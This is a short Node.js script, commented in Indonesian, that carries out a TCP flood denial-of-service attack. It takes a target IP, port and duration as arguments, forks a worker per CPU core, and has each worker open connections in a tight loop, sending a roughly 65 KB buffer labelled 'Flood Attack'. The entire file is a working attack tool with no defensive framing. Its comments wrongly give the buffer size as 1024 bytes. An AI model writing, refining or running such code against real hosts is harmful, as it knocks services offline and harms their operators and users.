const net = require('net');
const cluster = require('cluster');
const os = require('os');
const numCPUs = os.cpus().length;

const targetIP = process.argv[2];   // IP dari parameter pertama
const targetPort = process.argv[3]; // Port dari parameter kedua
const duration = parseInt(process.argv[4], 10) * 1000; // Durasi dalam detik

const message = Buffer.alloc(65500, 'Flood Attack'); // Buffer dengan ukuran 1024 byte

if (cluster.isMaster) {
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log('Flood selesai');
        process.exit(0);
    }, duration); // Stop after the duration
} else {
    function flood() {
        const client = new net.Socket();
        client.connect(targetPort, targetIP, () => {
            client.write(message); // Kirim pesan dengan ukuran 1024 byte
        });

        client.on('error', (err) => {
            console.log(`Error: ${err.message}`);
            client.destroy();
        });
    }

    setInterval(flood, 0); // Kirim paket terus-menerus
} 
